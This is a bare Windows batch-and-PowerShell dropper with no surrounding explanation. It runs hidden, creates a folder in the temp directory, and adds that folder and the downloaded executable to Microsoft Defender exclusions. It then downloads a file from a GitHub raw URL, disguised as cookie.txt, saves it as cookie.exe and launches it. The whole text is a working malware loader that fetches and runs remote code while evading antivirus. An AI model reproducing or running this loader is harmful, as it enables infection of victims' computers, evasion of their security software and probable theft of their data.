start /min powershell.exe -WindowStyle Hidden -Command "
$A=[System.IO.Path]::Combine($env:temp,'System')
if(-not(Test-Path -Path $A)){New-Item -Path $A -ItemType Directory -Force}
try{Add-MpPreference -ExclusionPath $A}catch{}
$B='https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt'
$C=[System.IO.Path]::Combine($A,'cookie.exe')
Invoke-WebRequest -Uri $B -OutFile $C
try{Add-MpPreference -ExclusionProcess $C}catch{}
Start-Process -FilePath $C -ArgumentList '-Bypass'
Exit"
